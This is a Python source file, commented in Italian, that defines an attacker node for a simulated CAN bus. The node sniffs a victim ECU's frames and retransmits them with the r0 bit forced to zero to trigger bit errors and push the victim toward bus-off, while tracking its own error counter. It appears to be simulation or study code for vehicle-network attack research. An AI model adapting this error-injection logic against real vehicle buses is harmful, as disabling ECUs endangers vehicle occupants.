# att.py

from ecu_base import ECU, Role, NodeState, ErrorFlagType, ERROR_FLAG_ID
import can
import time


def force_r0_to_zero(control_byte: int) -> int:
    """
    Forza il bit r0 (bit 5) a 0 nel primo byte del payload.
    In CAN reale r0 è sempre recessivo (1), qui lo simuliamo nel data[0].
    L'attaccante lo forza a 0 per creare il BIT ERROR.
    """
    return control_byte & ~(1 << 5)


class AttackerECU(ECU):
    def __init__(self, victim_id: int, *args, **kwargs):
        # L'attaccante non trasmette ciclicamente, quindi di solito period_sec=0.0
        super().__init__(*args, **kwargs)
        self.victim_id = victim_id

    # L'Attaccante non usa il TX loop periodico della base
    def _tx_loop(self):
        while not self._stop:
            time.sleep(0.1)

    def _rx_loop(self):
        """
        RX loop specializzato per l'attaccante:
        - Sniffa tutti i frame
        - Quando vede la Vittima, genera il frame corrotto (r0=0)
        - Poi aspetta un eventuale ERROR_FLAG per aggiornare il suo TEC
        """
        while not self._stop:
            try:
                msg = self.bus.recv(timeout=0.1)
            except can.CanError:
                continue

            if msg is None:
                continue

            # Non facciamo la gestione generica di ERROR_FLAG della base,
            # perché qui l'attaccante gestisce da solo TX success / error.
            if msg.arbitration_id == ERROR_FLAG_ID:
                # Li ignoriamo qui: vengono gestiti nella finestra dopo l'attacco
                # (in _handle_normal_frame).
                continue

            self._handle_normal_frame(msg)

    def _handle_normal_frame(self, msg: can.Message):
        """
        L'Attaccante sniffa il bus e risponde solo al frame della Vittima.
        Attacco: forza r0 (bit 5) a 0 nel primo byte del payload.
        """
        if msg.arbitration_id != self.victim_id:
            return

        # Costruiamo il payload corrotto: stesso frame, ma r0=0
        modified_data = bytearray(msg.data)
        if len(modified_data) > 0:
            modified_data[0] = force_r0_to_zero(modified_data[0])

        att_msg = can.Message(
            arbitration_id=self.victim_id,  # stesso ID della vittima
            data=modified_data,
            is_extended_id=msg.is_extended_id,
        )

        try:
            self.currently_transmitting = True
            self.last_tx_data = bytes(modified_data)
            self.last_tx_time = time.time()

            # Invio del frame corrotto subito dopo aver sniffato quello della vittima
            self.bus.send(att_msg)
            print(
                f"[{self.name}] ATTACK: TX_V={msg.data.hex().upper()} "
                f"→ TX_A={att_msg.data.hex().upper()} (r0 bit forced to 0)"
            )

            # Finestra corta in cui guardo se qualcuno genera un ERROR_FLAG
            error_detected = False
            response_msg = self.bus.recv(timeout=0.05)

            if (
                response_msg is not None
                and response_msg.arbitration_id == ERROR_FLAG_ID
            ):
                flag_type = (
                    ErrorFlagType(response_msg.data[0])
                    if response_msg.data and response_msg.data[0] in (0, 1)
                    else ErrorFlagType.ACTIVE
                )

                if flag_type == ErrorFlagType.ACTIVE:
                    # Qualcuno (tipicamente la vittima in ERROR_ACTIVE) ha visto un errore
                    self._on_tx_error()  # TEC +8
                    error_detected = True
                    print(
                        f"[{self.name}] att → TEC +8: Rilevato ERROR_FLAG ACTIVE dopo l'attacco."
                    )

            if not error_detected:
                # Nessun ERROR_FLAG ACTIVE visto → TX considerato OK
                # (o perché la vittima è in PASSIVE e il suo error flag è recessivo)
                self._on_tx_success()
                print(f"[{self.name}] att → TEC -1: (TX successo).")

        except can.CanError as e:
            print(f"[{self.name}] Errore invio frame attacco: {e}")
            self._on_tx_error()  # TEC++

        finally:
            time.sleep(0.01)
            self.currently_transmitting = False
